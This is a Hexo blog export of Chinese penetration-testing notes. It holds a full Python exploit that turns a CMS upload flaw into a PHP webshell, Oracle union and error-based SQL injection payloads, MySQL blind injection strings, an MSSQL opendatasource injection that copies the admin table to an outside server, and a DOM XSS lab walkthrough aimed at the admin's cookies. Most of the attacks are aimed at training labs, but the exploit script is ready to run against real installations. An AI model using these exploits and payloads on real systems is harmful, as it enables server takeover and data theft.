$this-&gt;json(P_Lang(&apos;没有指定要替换的附件&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $old_rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        if(!$old_rs)&#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;资源不存在&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $rs = $this-&gt;lib(&apos;upload&apos;)-&gt;upload(&apos;upfile&apos;);</span><br><span class="line">        if($rs[&quot;status&quot;] != &quot;ok&quot;)</span><br><span class="line">        &#123;</span><br><span class="line">            $this-&gt;json(P_Lang(&apos;附件上传失败&apos;));</span><br><span class="line">        &#125;</span><br><span class="line">        $arraylist = array(&quot;jpg&quot;,&quot;gif&quot;,&quot;png&quot;,&quot;jpeg&quot;);</span><br><span class="line">        $my_ext = array();</span><br><span class="line">        if(in_array($rs[&quot;ext&quot;],$arraylist))</span><br><span class="line">        &#123;</span><br><span class="line">            $img_ext = getimagesize($rs[&quot;filename&quot;]);</span><br><span class="line">            $my_ext[&quot;width&quot;] = $img_ext[0];</span><br><span class="line">            $my_ext[&quot;height&quot;] = $img_ext[1];</span><br><span class="line">        &#125;</span><br><span class="line">        //替换资源</span><br><span class="line">        $this-&gt;lib(&apos;file&apos;)-&gt;mv($rs[&quot;filename&quot;],$old_rs[&quot;filename&quot;]);</span><br><span class="line">        $tmp = array(&quot;addtime&quot;=&gt;$this-&gt;time);</span><br><span class="line">        $tmp[&quot;attr&quot;] = serialize($my_ext);</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;save($tmp,$id);</span><br><span class="line">        //更新附件扩展信息</span><br><span class="line">        $this-&gt;model(&apos;res&apos;)-&gt;gd_update($id);</span><br><span class="line">        $rs = $this-&gt;model(&apos;res&apos;)-&gt;get_one($id);</span><br><span class="line">        $this-&gt;json($rs,true);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>这里我们输入一个oldid的值，然后从res表中查找出这一行的数据，然后将我们上传的文件mv到$old_rs[‘filename’]。<br>mv函数的定义在/framework/libs/file.php中第264行:</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">public function mv($old,$new,$recover=true)</span><br><span class="line">    &#123;</span><br><span class="line">        if(!file_exists($old))&#123;</span><br><span class="line">            return false;</span><br><span class="line">        &#125;</span><br><span class="line">        if(substr($new,-1) == &quot;/&quot;)&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;dir&quot;);</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $this-&gt;make($new,&quot;file&quot;);</span><br><span class="line">        &#125;</span><br><span class="line">        if(file_exists($new))&#123;</span><br><span class="line">            if($recover)&#123;</span><br><span class="line">                unlink($new);</span><br><span class="line">            &#125;else&#123;</span><br><span class="line">                return false;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;else&#123;</span><br><span class="line">            $new = $new.basename($old);</span><br><span class="line">        &#125;</span><br><span class="line">        rename($old,$new);</span><br><span class="line">        return true;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通过上文说到的，我们可以控制res表中的一行记录的值，那么这个filename也是我们可控的，那么我们如果将filename设置为/res/balisong.php。那么我上传的图片文件就会重新命名成/res/balisong.php。我们就达到了一个getshell的目的。</p><p>由于上传的文件名的特殊性。导致我们不能带有斜杠，那么怎么办呢？我们可以利用十六进制编码来绕过，具体的漏洞利用过程就不细说了，比较复杂，所以直接上exp：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line">\#-*- coding:utf-8 -*-</span><br><span class="line">import requests</span><br><span class="line">import sys</span><br><span class="line">import re</span><br><span class="line">if len(sys.argv) &lt; 2:</span><br><span class="line">    print u&quot;Usage: exp.py url [PHPSESSION]\r\nFor example:\r\n[0] exp.py http://localhost\r\n[1] exp.py http://localhost 6ogmgp727m0ivf6rnteeouuj02&quot;</span><br><span class="line">    exit()</span><br><span class="line">baseurl = sys.argv[1]</span><br><span class="line">phpses = sys.argv[2] if len(sys.argv) &gt; 2 else &apos;&apos;</span><br><span class="line">cookies = &#123;&apos;PHPSESSION&apos;: phpses&#125;</span><br><span class="line">if baseurl[-1] == &apos;/&apos;:</span><br><span class="line">    baseurl = baseurl[:-1]</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=save&apos;</span><br><span class="line">files = [</span><br><span class="line">    (&apos;upfile&apos;, (&quot;1&apos;,&apos;r7ip15ijku7jeu1s1qqnvo9gj0&apos;,&apos;30&apos;,&apos;&apos;),(&apos;1&apos;,0x7265732f3230313730352f32332f,0x393936396465336566326137643432352e6a7067,&apos;&apos;,0x7265732f62616c69736f6e672e706870,&apos;1495536080&apos;,&apos;2.jpg&quot;,</span><br><span class="line">                &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">files1 = [</span><br><span class="line">    (&apos;upfile&apos;,</span><br><span class="line">     (&apos;1.jpg&apos;, &apos;&lt;?php phpinfo();?&gt;&apos;, &apos;image/jpg&apos;)),</span><br><span class="line">]</span><br><span class="line">r = requests.post(url, files=files, cookies=cookies)</span><br><span class="line">response = r.text</span><br><span class="line">id = re.search(&apos;&quot;id&quot;:&quot;(\d+)&quot;&apos;, response, re.S).group(1)</span><br><span class="line">id = int(id) + 1</span><br><span class="line">url = baseurl + &apos;/index.php?c=upload&amp;f=replace&amp;oldid=%d&apos; % (id)</span><br><span class="line">r = requests.post(url, files=files1, cookies=cookies)</span><br><span class="line">shell = baseurl + &apos;/res/balisong.php&apos;</span><br><span class="line">response = requests.get(shell)</span><br><span class="line">if response.status_code == 200:</span><br><span class="line">    print &quot;congratulation:Your shell:\n%s\npassword:balisong&quot; % (shell)</span><br><span class="line">else:</span><br><span class="line">    print &quot;oh!Maybe failed.Please check&quot;</span><br></pre></td></tr></table></figure><p>系统默认是不需要注册登录即可上传文件的。</p><h2 id="结语"><a href="#结语" class="headerlink" title="结语"></a>结语</h2><p>其实这种情况还是蛮多的，有些系统会将上传前的文件名入库，如果过滤不当，就可以注入了。并且insert，update这种注入危害是可以进一步扩大的。</p><p>转载于<a href="https://xz.aliyun.com/t/1569/#toc-1" target="_blank" rel="noopener">https://xz.aliyun.com/t/1569/#toc-1</a></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Oracle注入-报错注入</title>
      <link href="/2019/12/07/oracle%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/oracle%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<h2 id="Oracle-报错注入"><a href="#Oracle-报错注入" class="headerlink" title="Oracle 报错注入"></a>Oracle 报错注入</h2><p>进行测试或漏洞挖掘的时候发现出现了数据库报错信息，可以优先选择报错注入，报错注入就是使用报错的方式将查询数据的结果带出到错误页面中，使用报错注入需要使用类似 1=[报错语句]，1&gt;[报错语句]，使用比较运算符，这样的方式进行报错注入（MYSQL仅使用函数报错即可）</p><h2 id="注入小提示"><a href="#注入小提示" class="headerlink" title="注入小提示"></a>注入小提示</h2><ul><li>Oracle 使用查询语句获取数据时需要跟上表名</li><li>没有表的情况下可以使用dual，dual是Oracle的虚拟表，用来构成select的语法规则.</li><li>Oracle保证dual里面永远只有一条记录。</li><li>填充字段数要用null填充</li><li>Oracle的单行注释符号是–</li></ul><p>oracle注入我们首先想到的是联合查询注入：</p><h2 id="oracle联合查询的注入步骤："><a href="#oracle联合查询的注入步骤：" class="headerlink" title="oracle联合查询的注入步骤："></a>oracle联合查询的注入步骤：</h2><ul><li>判断字段数(一些闭合注释)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;order by 4--</span><br></pre></td></tr></table></figure><ul><li>通过测试数据类型来判断回显位置(发现可输出字符串的为2,3,4个字段)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos;union all select null,&apos;null&apos;,&apos;null&apos;,&apos;null&apos; from dual--</span><br></pre></td></tr></table></figure><ul><li>获取数据库版本信息：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select banner from  sys.v_$version where rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取表名:</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union all select null,(select table_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1),null,null from dual --</span><br></pre></td></tr></table></figure><ul><li>获取关键表中的列名(我们可以通过<strong>and 字段名&lt;&gt;字段值</strong>来排除不想要的字段名，就是说将 字段名=指定字段值进行排除)：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where rownum=1),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos;),null from dual --</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select null,(select column_name from user_tables where table_name=&apos;ADMIN&apos; and rownum=1 and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos;),null from dual --</span><br></pre></td></tr></table></figure><p>通过逐步排除来得到自己所想要的字段名；</p><ul><li>再获取关键字段中的字段数据</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; union select FLAG_FLAG from admin --</span><br></pre></td></tr></table></figure><h2 id="oracle-报错注入"><a href="#oracle-报错注入" class="headerlink" title="oracle 报错注入"></a>oracle 报错注入</h2><ul><li>CTXSYS.DRITHSX.SN()</li></ul><p>去查询关于主题的对应关键词，然后因为查询失败（应该是这个用户没有创建和查询的权限，默认情况没有创建，爆出未查询到的错误从而爆出查询内容，我们可以通过这个函数将查询内容通过报错爆出查询内容；</p><ul><li>oracle注入的一些数据库语句：</li></ul><p>select bannner from sys.v_$version where rownum=1     查询数据库版本；</p><p>select table_name from user_tables where rownum=1  查询表名；</p><p>select column_name from user_tab_columns where table_name=’ADMIN’ and rownum=1  查询字段名；</p><p>select [字段] from [表名]  查询内容；</p><p>select * from all_table 查询出所有表；</p><p>select * from user_tables 查询出当前用户的表；</p><p>select * from all_tab_columns  查询所有的字段；</p><p>select * from user_tab_columns 查询当前用户的字段；</p><h2 id="oracle-报错注入的步骤："><a href="#oracle-报错注入的步骤：" class="headerlink" title="oracle 报错注入的步骤："></a>oracle 报错注入的步骤：</h2><ul><li>闭合注释语句：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos;--</span><br></pre></td></tr></table></figure><ul><li>查询表名：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询第一个字段：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询除ID、USER_NAME、PASSWORD外的字段，并返回一行结果：</li></ul><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select column_name from user_tab_columns where table_name=&apos;ADMIN&apos; and column_name&lt;&gt;&apos;ID&apos; and column_name&lt;&gt;&apos;USER_NAME&apos; and column_name&lt;&gt;&apos;PASSWORD&apos; and rownum=1))--</span><br></pre></td></tr></table></figure><ul><li>查询到我们需要的字段FLAG_FLAG</li></ul><ul><li>查询字段内容：<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://o1.lab.aqlab.cn:81/?id=1&apos; and 1=ctxsys.drithsx.sn(1,(select FLAG_FLAG from ADMIN where rownum=1))--</span><br></pre></td></tr></table></figure></li></ul><p>最后可以成功查询到我们想知道的字段内容！</p><h3 id="常用的一些报错函数："><a href="#常用的一些报错函数：" class="headerlink" title="常用的一些报错函数："></a>常用的一些报错函数：</h3><ul><li>utl_inaddr.get_host_name()</li><li>ctxsys.drithsx.sn()</li><li>XMLType()</li><li>dbms_xdb_version.checkin()</li><li>dbms_xdb_version.makeversioned()</li><li>dbms_xdb_version.uncheckout()</li><li>dbms_utility.sqlid_to_sqlhash()</li><li>ordsys.ord_dicom.getmappingxpath()</li></ul>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>sql盲注</title>
      <link href="/2019/12/07/mysqlmanzu/"/>
      <url>/2019/12/07/mysqlmanzu/</url>
      
        <content type="html"><![CDATA[<h2 id="sql盲注介绍"><a href="#sql盲注介绍" class="headerlink" title="sql盲注介绍"></a>sql盲注介绍</h2><p>何为盲注？盲注就是在 sql 注入过程中，sql 语句执行的选择后，选择的数据不能回显到前端页面，而对于攻击者来说也缺少了非常重要的“调试信息”，此时，我们需要利用一些方法进行判断或者尝试，这个过程称之为盲注。</p><ul><li><strong>布尔盲注：</strong></li></ul><p>布尔盲注，顾名思义，只有Ture和False，也就是说它只会根据你的注入信息返回Ture跟False，也就是说，不会再显示之前的显错信息了。(我们可以利用逻辑判断进行截取字符串）</p><ul><li><strong>时间盲注</strong></li></ul><p>界面返回值只有一种结果ture，无论输出任何值,返回情况都会按ture值来返回正常页面，加入特定的时间函数，通过查看web页面返回时间差来判断注入的语句是否正确。</p><h2 id="常用盲注函数"><a href="#常用盲注函数" class="headerlink" title="常用盲注函数"></a>常用盲注函数</h2><ul><li><p>length（）函数 返回字符串的长度</p></li><li><p>substr（）函数 截取字符串 </p></li><li></li><li><p>ascii（） 返回字符串的ascii码</p></li><li><p>sleep（n）将程序挂起一段时间，n为n秒</p></li><li><p>if（expr1，expr2，expr3）判断语句，如果第一个语句正确就执行第二个，如果错误，就执行第三个语句；</p></li></ul><h3 id="布尔盲注一般流程："><a href="#布尔盲注一般流程：" class="headerlink" title="布尔盲注一般流程："></a>布尔盲注一般流程：</h3><p>猜解数据库名称长度：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">id=1&apos;and(length(database()))&gt;9--+/23%(#)</span><br></pre></td></tr></table></figure></p><p>利用ascii码猜解当前数据库名称：返回正常，说明数据库名称第一位是s</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),1,1)))=115--+</span><br></pre></td></tr></table></figure><p>返回正常，说明数据库名称第二位是e（通过移动第二位数来一位一位的猜出……<br>）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr(database(),2,1)))=101--+</span><br></pre></td></tr></table></figure></p><p>猜表名：返回正常，说明数据库第一个表名的第一位是e<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">and(adcii(substr((select table name from information_schema.tables where table_schema=database() limit 0,1),1,1)))=101</span><br><span class="line">--+</span><br></pre></td></tr></table></figure></p><p>猜字段名：返回正常，说明zkaq表中的列名称第一位是f<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and(ascii(substr((select column_name from information_schema.columns where table_name=&apos;zkaq&apos; limit 0,1),1,1)))=102--+</span><br></pre></td></tr></table></figure></p><p>猜内容：返回正常，说明zKaQ列第一位是z<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">and（ascii(substr((select zKzQ from zkaq limit 4,1),1,1)))=122--+</span><br></pre></td></tr></table></figure></p><p>具体就是一位一位的猜……其实这样挺麻烦的，可以通过sqlmap进行注入。</p><h3 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h3><p>主要通过sleep函数进行注入：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?id=1&apos;and if(ascii(substr(databse(),1,1))=115,sleep(5),1)#</span><br></pre></td></tr></table></figure><p>通过if判断执行sql语句，如果条件为真就执行sleep 停5秒再返回，如果为假就执行1即立即返回页面</p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>mssql反弹注入</title>
      <link href="/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/"/>
      <url>/2019/12/07/mssql%E5%8F%8D%E5%BC%B9%E6%B3%A8%E5%85%A5/</url>
      
        <content type="html"><![CDATA[<p>我们通过’去检测，发现出现了报错，显示<strong>odbc exec()</strong>in C:\Users\Administrator\Desktop\phpstudy\WWW\MSSQL\index.php on line 13,说明用的是mssql数据库；</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/L5ya2V*ygEG.5muAFL5ET6AxyulNaRiLwpRO1EFtodA!/b/dLgAAAAAAAAA&amp;bo=QQSjAAAAAAADB8Q!&amp;rf=viewer_4" alt></p><p>我们通过测试去尝试注入，发现都很难以进行注入，又是mssql数据，那我们可以尝试通过反弹注入；</p><h2 id="反弹注入介绍："><a href="#反弹注入介绍：" class="headerlink" title="反弹注入介绍："></a>反弹注入介绍：</h2><p>反弹注入就是利用<strong>SQL SERVER的opendatasource() 函数</strong>，来将当前数据库查询结果发送到另一个外网服务器的SQL SERVER数据库中，然后我们在通过外网服务器的（自己搭建）数据库去查看我们查询的结果</p><h2 id="注入步骤："><a href="#注入步骤：" class="headerlink" title="注入步骤："></a>注入步骤：</h2><ul><li>首先我们要在接收查询结果的服务器上，去搭建好SQL SERVER数据库的环境，然后建立一个具有管理权限的数据库账户</li></ul><p>（在这里我们可以通过<a href="http://www.webweb.com/" target="_blank" rel="noopener">香港云</a>去创建一个临时数据库并在里面创建一个数据库）</p><p>（注意：要记住创建数据库地址，数据库名，用户名，登录密码，在后面我们要通过他们来传送自己查询的数据到服务器的数据库上）</p><ul><li><strong>在DB_14A8E33_4veqjdc8建立t1表；</strong><br> <img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YXHhYQhTY3Zh2Xx3KguZ4REiacY0bIEba3L00BE0tso!/b/dDQBAAAAAAAA&amp;bo=EwXNAQAAAAADF.g!&amp;rf=viewer_4" alt></li><li>然后我们通过访问带有opendatasource() 函数的插入语句将查询语句的结果发送到另一个数据库服务器中:</li></ul><p>在这，mssql的名称为sqloledb；再通过连接地址、端口、用户名、密码、数据库名：server=连接地址，端口，uid=用户名，pwd=密；database=数据库名称。连接上服务器后选定数据表DB_14A8E33_4veqjdc8.dbo.t1把后面语句查询结果插入到表中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://120.203.13.75:8150/MSSQL/?id=2&apos;; insert into opendatasource(&apos;sqloledb&apos;,&apos;server=SQL5006.webweb.com,1433;uid=DB_14A8E33_4veqjdc8_admin;pwd=123456789;database=DB_14A8E33_4veqjdc8&apos;).DB_14A8E33_4veqjdc8.dbo.t1 select * from admin --</span><br></pre></td></tr></table></figure><p>这里是通过；结束，在起一行sql语句，这里可以是说使用了堆叠注入；<br>反弹注入用一句话总结：就是让我们目标的数据库去查询那张表，然后将sql语句查询内容插入到公网的一台服务器的数据库中去。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/As84F9cHvY.Jrw7e8F5V0q8IfyQrL0Ko7jL2t4Qn4E0!/b/dL4AAAAAAAAA&amp;bo=fQfHAAAAAAADB58!&amp;rf=viewer_4" alt></p><p>发现显示正常，那么可能就是发送到服务器的数据库成功了，语句成功执行</p><ul><li>然后我们去通过访问服务器上的数据库DB_14A8E33_4veqjdc8的t1表，获取到了我们想要查询的数据：</li></ul><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/5iF49ap5Ts4aLiPrYXtsQiYKmUokAEMUQJazAnH7H44!/b/dL4AAAAAAAAA&amp;bo=cgZWAAAAAAADFxA!&amp;rf=viewer_4" alt></p>]]></content>
      
      
      <categories>
          
          <category> 笔记 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Hello World</title>
      <link href="/2019/12/07/hello-world/"/>
      <url>/2019/12/07/hello-world/</url>
      
        <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/" target="_blank" rel="noopener">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/" target="_blank" rel="noopener">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html" target="_blank" rel="noopener">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues" target="_blank" rel="noopener">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">"My New Post"</span></span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html" target="_blank" rel="noopener">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html" target="_blank" rel="noopener">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html" target="_blank" rel="noopener">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/deployment.html" target="_blank" rel="noopener">Deployment</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>dosXSS</title>
      <link href="/2019/12/07/domxss/"/>
      <url>/2019/12/07/domxss/</url>
      
        <content type="html"><![CDATA[<p>进入靶场一看，我们先使用最经典的弹窗语句去测试：发现页面上无弹窗，我们发现了一个奇怪的地方</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/YRHxe6f8yYglIbLiTVCPBDVNd2zBNKspS.YO3oO3uVM!/b/dDQBAAAAAAAA&amp;bo=wwaJAwAAAAADB20!&amp;rf=viewer_4" alt></p><p>我们通过查看代码发现语句变成这样了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Em9retJmjwJZ90Ast9xNFM5nxtQ9chksuXjpJKSKsL4!/b/dMEAAAAAAAAA&amp;bo=PgKtAAAAAAADF6M!&amp;rf=viewer_4" alt></p><p>我们尝试着闭合语句试试，竟然出现弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/n9truDqd*7gTaa*V1aN0SUsbUPOjHBbpStMHfr9zjPI!/b/dL8AAAAAAAAA&amp;bo=RAU7AgAAAAADF0o!&amp;rf=viewer_4" alt></p><p>通过发生事件也出现了弹框</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/BcJ437.MUOuKvqZ1AifD455v6KT4wfcIC8wVcnVcARE!/b/dL8AAAAAAAAA&amp;bo=mgVZAwAAAAADF*c!&amp;rf=viewer_4" alt></p><p>我们试着在下面的聊天框也测试测试，凡是看见有框就插。。</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/xfbHa701ePPTCRPq9C6PIC61AXFoGe.fq.Hri2ovwGo!/b/dDQBAAAAAAAA&amp;bo=iAVgAwAAAAADF9w!&amp;rf=viewer_4" alt></p><p>发现也弹窗了，以上这些都属于反射型XSS；<br>我们在靶场提示中知道了管理员会去访问dom.php页面，并且将源码透露给我们看了</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/Gr1bzDuvtcou7WGDWdD4uGlAftdW66fORIKrFwhQDJc!/b/dFIBAAAAAAAA&amp;bo=IgRUAgAAAAADF0I!&amp;rf=viewer_4" alt></p><p>我们通过粗略的看了下代码，发现他通过get方式接受url的值，并进行解码，如果url的值与正则匹配的话，就传入参数进行过滤并将其插入到iframe内联框中，并将其添加到log.html后面</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/WDJLFWUthFop*NhuYXkMMSTK5rGAbaT.oeSn3hiY1yQ!/b/dDQBAAAAAAAA&amp;bo=3QaEAwAAAAADF24!&amp;rf=viewer_4" alt></p><p>那我们知道了，所写的代码最终会传到log.html上去，而管理员也会定期查看，那我们能不能通过构造代码去传入到log.html。并获取管理员cookie。<br>那我们试着访问dom.php,我们发现里面什么都没有，</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/N7D3*PMyd2ZMwYEMPmitnJrcLadAgf.mXC.pA8Ibn1Y!/b/dL4AAAAAAAAA&amp;bo=EAcbAwAAAAADFz0!&amp;rf=viewer_4" alt></p><p>如果我们把在聊天室插到的url上的xss拿过来试试能不能再这执行成功</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/AwHAQYSnD3zaeAOi0PuxXfVhRzpqON7buau7Tw2Xl8Y!/b/dDEBAAAAAAAA&amp;bo=HQaHAAAAAAADF64!&amp;rf=viewer_4" alt></p><p>我们试着登录log.html，发现竟然弹窗了!</p><p><img src="http://m.qpic.cn/psb?/V10ZDHQP0EtwOl/8XtZjgHLYxPkMOvmH3WScSxW9PboAof3wNvmOy.3ddU!/b/dMAAAAAAAAAA&amp;bo=7QTMAQAAAAADFxY!&amp;rf=viewer_4" 